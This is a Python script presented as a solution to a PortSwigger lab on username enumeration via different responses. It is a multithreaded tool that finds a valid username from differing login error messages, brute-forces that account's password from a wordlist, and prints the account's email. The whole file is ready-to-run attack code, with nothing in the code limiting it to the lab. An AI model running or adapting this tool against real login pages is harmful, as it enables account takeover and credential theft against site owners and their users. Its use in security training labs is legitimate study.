from requests import request
from io import FileIO
from concurrent.futures import ThreadPoolExecutor, as_completed
from sys import argv

def readWorldList(wordlist_name):
    try:
        worldlist=FileIO(wordlist_name).read().decode().split('\n')
        while worldlist.count(''):
            worldlist.remove('')
        return worldlist
    except :
        print('[-] Error While reading file')

def get_session(url):
    print('GET /login')
    res=request(url=url+'login',method='GET')
    cookie=res.headers.get('Set-Cookie').split(';')[0]
    return cookie



def enumerate_username_worker(url, cookie, username):
    print('[!] Trying Username : '+username)
    data='username='+username+'&password=enum'
    res=request(url=url+'login',method='POST',data=data,headers={'Cookie':cookie})
    
    if res.content.decode().count('Invalid username')==0:
        print('[+] Found Username : '+username)
        return username
    else:
        return None

def enumerate_username(url, cookie ,user_list):
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_username = {}
        for username in user_list:
            future = executor.submit(enumerate_username_worker, url, cookie, username)
            future_to_username[future] = username
        
        for future in as_completed(future_to_username):
            username = future_to_username[future]
            try:
                result = future.result()
                if result:
                    executor.shutdown(wait=False)
                    for f in future_to_username.keys():
                        if f != future:
                            f.cancel()
                    return result

            except Exception as exc:
                print('[!] Thread %s generated an exception: %s' % (username, exc))

def bruteforce_passwrod_worker(url, cookie, username,password):
    print('[!] Trying Password : '+password)
    data='username='+username+'&password='+password
    res=request(url=url+'login',method='POST',data=data,headers={'Cookie':cookie})
    
    if res.content.decode().count('Incorrect password')==0:
        print('[+] Found username : '+username + ' with password : '+password)
        content=res.content.decode()
        emailStartIndex=content.index('Your email is:')
        print(content[emailStartIndex:-1].split("</p>")[0])
        return True
    else:
        return False


def bruteforce_passwrod(url, cookie ,password_list,username):
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_password= {}
        for password in password_list:
            future = executor.submit(bruteforce_passwrod_worker, url, cookie, username,password)
            future_to_password[future] = password
        
        for future in as_completed(future_to_password):
            try:
                result = future.result()
                if result:
                    executor.shutdown(wait=False)
                    for f in future_to_password.keys():
                        if f != future:
                            f.cancel()
                    return result

            except Exception as exc:
                print('[!] Thread %s generated an exception: %s' % (password, exc))



def pwn(url,username_wordlist_path,password_wordlist_path):
    if url[-1]!='/':
        url=url+'/'
    username_wordlist=readWorldList(username_wordlist_path)
    password_wordlist=readWorldList(password_wordlist_path)
    cookie=get_session(url)
    username=enumerate_username(url,cookie,username_wordlist)
    password=bruteforce_passwrod(url,cookie,password_wordlist,username)
    return {'username':username,'password':password}

if __name__ == "__main__":
 print("""
    0xCrypt00o Solution for Portswigger LAB : Username-Enumeration-Via-Different-Responses
        For More Solutions check :
                https://github.com/Crypt00o/Portswigger-Labs/
    """)
 if len(argv)==4:
     pwn(argv[1],argv[2],argv[3])
 else:
     print("call it with : ./pwn-auth-username-enumeration-via-different-responses.py <url> <path to username wordlist> <path to password wordlist> ")
 
